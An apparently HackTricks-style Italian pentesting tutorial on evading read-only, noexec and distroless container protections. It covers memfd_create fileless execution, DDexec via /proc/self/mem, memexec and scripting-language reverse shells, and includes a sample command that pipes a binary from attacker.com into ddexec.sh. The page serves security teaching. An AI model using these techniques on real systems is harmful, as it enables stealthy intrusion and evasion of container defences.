# Bypass delle protezioni FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Video

Nei seguenti video trovi una spiegazione più approfondita delle tecniche menzionate in questa pagina:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Scenario read-only / no-exec

In un container, puoi montare il filesystem root in sola lettura impostando **`readOnlyRootFilesystem: true`** nel security context.<sup>[[3]](#references)</sup> Ad esempio:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Un filesystem root in sola lettura non rende di sola lettura i volumi montati separatamente. Docker tratta **`/dev/shm`** come un mount IPC, mentre opzioni tmpfs come `rw` e `noexec` sono scelte di configurazione del runtime; controlla le opzioni di mount del container di destinazione prima di fare affidamento su uno di questi comportamenti.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Dal punto di vista di un red team, questa combinazione può rendere difficile scaricare ed eseguire binari non già disponibili (ad esempio backdoor o strumenti di enumerazione).<sup>[[4]](#references)[[5]](#references)</sup>

## Bypass più semplice: script

Un mount `noexec` blocca l'esecuzione diretta dei binari presenti su quel mount, ma un interprete può comunque leggere ed eseguire uno script. Se sono presenti `sh` o `python`, puoi quindi eseguire uno script shell o Python tramite l'interprete corrispondente.<sup>[[5]](#references)</sup>

Questo non è utile quando lo strumento richiesto è a sua volta un binario.<sup>[[5]](#references)</sup>

## Bypass tramite memoria

Quando l'esecuzione diretta da un percorso montato è bloccata, una possibilità consiste nel caricare l'ELF in memoria ed eseguirlo tramite un percorso in-memory. Questo evita il controllo `noexec` su quel mount, ma non elimina altri controlli del kernel, di autorizzazione o di policy.<sup>[[5]](#references)[[6]](#references)</sup>

### Bypass tramite FD + syscall exec

Se un runtime di scripting può accedere all'interfaccia Linux pertinente, può creare un file descriptor anonimo basato sulla RAM con **`memfd_create(2)`**, scrivervi i byte dell'ELF e usare un percorso di esecuzione basato su fd. Il progetto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) genera codice Python, Perl o Ruby compresso e codificato in base64 per questo flusso di lavoro.<sup>[[6]](#references)[[7]](#references)</sup>

Il progetto documenta attualmente target Python, Perl e Ruby; PHP o Node richiedono una tecnica o un'estensione specifica per il runtime, quindi l'assenza di questo generatore per un linguaggio non significa che l'esecuzione in-memory sia impossibile.<sup>[[6]](#references)[[12]](#references)</sup>

Consulta [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) per una trattazione più ampia dell'esecuzione tramite file anonimi, dei relativi pattern di staging e del rilevamento e della raccolta forense.

> [!WARNING]
> Un normale eseguibile scritto in **`/dev/shm`** resta soggetto all'impostazione **`noexec`** di quel mount; aprirlo semplicemente tramite un normale file descriptor non modifica la policy del mount.<sup>[[5]](#references)</sup>
>
> Il metodo esatto per l'esecuzione in memoria dipende inoltre dal runtime, dall'architettura, dal kernel e dalle autorizzazioni disponibili.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) scrive uno stager e un loader nel processo shell in esecuzione tramite **`/proc/self/mem`**, quindi trasferisce il controllo a quel codice.<sup>[[8]](#references)</sup>

Questo consente al processo di caricare un binario fornito senza prima collocarlo su un filesystem eseguibile.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** può caricare ed **eseguire** shellcode o un binario dalla **memoria**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Per ulteriori informazioni su questa tecnica, consulta GitHub oppure:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) è un'implementazione di DDexec eseguita come daemon. Il daemon ascolta le richieste contenenti argomenti e byte grezzi del programma, crea un processo figlio per caricare ed eseguire ogni programma e mantiene il processo padre come server.<sup>[[9]](#references)</sup>

Il repository include un esempio di utilizzo di **memexec per eseguire binari da una reverse shell PHP** in [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Con uno scopo simile a DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) è un'implementazione fileless di `dlopen()` per un oggetto condiviso o un programma. Il README documenta attualmente il supporto ARM64: verifica quindi l'architettura del target prima di usarlo.<sup>[[10]](#references)</sup>

## Distroless Bypass

Per una spiegazione dedicata di **cosa sia davvero distroless**, quando è utile, quando non lo è e come cambia le tecniche di post-exploitation nei container, consulta:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### What is distroless

Le immagini distroless contengono solo l'applicazione e le relative dipendenze runtime; le immagini ufficiali escludono package manager, shell e altri programmi previsti in una distribuzione Linux standard.<sup>[[11]](#references)</sup>

Limitare l'immagine runtime a queste dipendenze riduce il software presente in produzione e la quantità da scansionare e monitorare.<sup>[[11]](#references)</sup>

### Reverse Shell

In un container distroless potresti **non trovare `sh` o `bash`** per una shell normale, né utility comuni come `ls`, `whoami` o `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Di conseguenza, una normale reverse shell basata su shell o l'enumerazione tramite utility potrebbero non funzionare.<sup>[[11]](#references)</sup>

Se l'applicazione compromessa include un runtime di linguaggio (per esempio, Python per un'applicazione Flask o Node.js per un'applicazione Node), un RCE potrebbe comunque sfruttarlo per creare un canale di comando e ispezionare il sistema tramite le sue API.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Usa il linguaggio di scripting disponibile per **enumerare il sistema** tramite le funzionalità offerte dal linguaggio.<sup>[[12]](#references)</sup>

Se non sono presenti protezioni **read-only/no-exec**, un canale di comando potrebbe scrivere binari su un mount scrivibile ed eseguibile ed eseguirli; verifica prima le opzioni di mount e i permessi.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Quando sono presenti queste protezioni, usa le **tecniche di esecuzione in memoria descritte sopra**, se consentito dal runtime, dal kernel e dai permessi.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Puoi trovare **esempi** di sfruttamento di vulnerabilità RCE per ottenere **reverse shell** tramite linguaggi di scripting ed eseguire binari dalla memoria in [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Esplorare la manipolazione della memoria Linux per stealth ed evasione](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Intrusioni stealth con DDexec-ng e dlopen() in memoria - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Configurare un contesto di sicurezza per un pod o un container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - pagina del manuale Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - pagina del manuale Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
